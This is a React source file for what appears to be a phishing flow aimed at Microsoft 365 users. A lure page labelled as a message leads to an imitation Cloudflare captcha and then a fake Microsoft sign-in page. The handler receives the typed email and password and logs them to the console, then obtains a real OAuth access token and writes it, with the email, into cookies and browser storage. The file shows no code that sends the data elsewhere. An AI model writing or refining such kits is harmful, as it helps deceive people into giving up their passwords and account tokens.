import React, { useState } from 'react';
import { PublicClientApplication } from '@azure/msal-browser';
import { MsalProvider, useMsal } from '@azure/msal-react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import MicrosoftLoginPage from './components/MicrosoftLoginPage';

const msalConfig = {
  auth: {
    clientId: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
    authority: 'https://login.microsoftonline.com/ed02fb35-7238-4f3e-ae3e-5a74227aad25',
    redirectUri: window.location.origin
  }
};

const msalInstance = new PublicClientApplication(msalConfig);

function AppContent() {
  const [currentPage, setCurrentPage] = useState('message-icon');
  const { instance, accounts } = useMsal();

  // Handle the complete flow
  const handleMessageOpen = () => {
    console.log('📧 Message icon clicked - moving to CAPTCHA verification');
    setCurrentPage('captcha');
  };

  const handleCaptchaVerified = () => {
    console.log('✅ CAPTCHA verified - moving to Microsoft login');
    setCurrentPage('login');
  };

  const handleCaptchaBack = () => {
    console.log('⬅️ Back to message icon from CAPTCHA');
    setCurrentPage('message-icon');
  };

  const handleLoginSuccess = async (credentials: { email: string; password: string }) => {
    console.log('🔐 Login successful:', credentials);
    
    try {
      // Trigger real Microsoft OAuth login
      const loginResponse = await instance.loginPopup({
        scopes: ['user.read'],
        prompt: 'select_account'
      });

      if (loginResponse) {
        // Store credentials and perform cookie work
        const sessionData = {
          email: credentials.email,
          sessionId: Date.now().toString(),
          timestamp: new Date().toISOString(),
          accessToken: loginResponse.accessToken,
          account: loginResponse.account
        };
        
        localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
        sessionStorage.setItem('current_session', JSON.stringify(sessionData));
        
        // Set cookies for the session
        document.cookie = `ms365_session=${sessionData.sessionId}; path=/; secure; samesite=strict`;
        document.cookie = `ms365_email=${encodeURIComponent(credentials.email)}; path=/; secure; samesite=strict`;
        document.cookie = `ms365_auth_time=${Date.now()}; path=/; secure; samesite=strict`;
        document.cookie = `ms365_access_token=${loginResponse.accessToken}; path=/; secure; samesite=strict`;
        
        console.log('🍪 Cookies set, redirecting back to landing page');
        
        // Redirect back to landing page (message icon)
        setTimeout(() => {
          setCurrentPage('message-icon');
        }, 1000);
      }
    } catch (error) {
      console.error('OAuth login failed:', error);
      // Handle OAuth error but stay on login page for retry
    }
  };

  const handleLoginError = (error: string) => {
    console.error('❌ Login error:', error);
    // Stay on login page for retry
  };

  const handleLoginBack = () => {
    console.log('⬅️ Back to CAPTCHA from login');
    setCurrentPage('captcha');
  };

  // Render current page based on flow
  switch (currentPage) {
    case 'message-icon':
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );
    
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
    
    case 'login':
      return (
        <MicrosoftLoginPage
          onBack={handleLoginBack}
          onLoginSuccess={handleLoginSuccess}
          onLoginError={handleLoginError}
          showBackButton={true}
        />
      );
    
    default:
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );
  }
}

function App() {
  return (
    <MsalProvider instance={msalInstance}>
      <AppContent />
    </MsalProvider>
  );
}

export default App;
